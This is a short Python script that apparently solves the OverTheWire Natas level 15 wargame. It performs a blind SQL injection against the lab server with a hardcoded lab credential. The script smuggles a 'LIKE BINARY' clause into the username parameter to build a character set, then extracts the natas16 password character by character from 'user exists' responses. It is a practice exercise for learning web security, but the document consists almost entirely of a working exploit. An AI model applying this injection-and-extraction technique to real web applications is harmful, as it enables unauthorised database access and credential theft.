#!/bin/python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"

auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

#characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

password_dictionary = []

exsits_str = "This user exists."

for char in characters:
    #QUERY SELECT * from users where username="natas16" and password LIKE BINARY "$NATAS16_PASSWORD%"
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%'])
    r = requests.get(uri, auth=(auth_username,auth_password))
    if exsits_str in r.text:
        password_dictionary.append(char)
        print("Password Dictionary:",password_dictionary)

print("[+]Dictonnary build complete.")
print(f"[+]Dictionary: {password_dictionary}")

print("Now attempting to brute force...")
password_list = []
password = ''
for i in range(1,64):
    for char in password_dictionary:
        test = ''.join([password,char])
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%'])
        r = requests.get(uri, auth=(auth_username,auth_password))
        if exsits_str in r.text:
            password_list.append(char)
            password = ''.join(password_list)
            print(f"Length:{len(password)}, Password:{password}")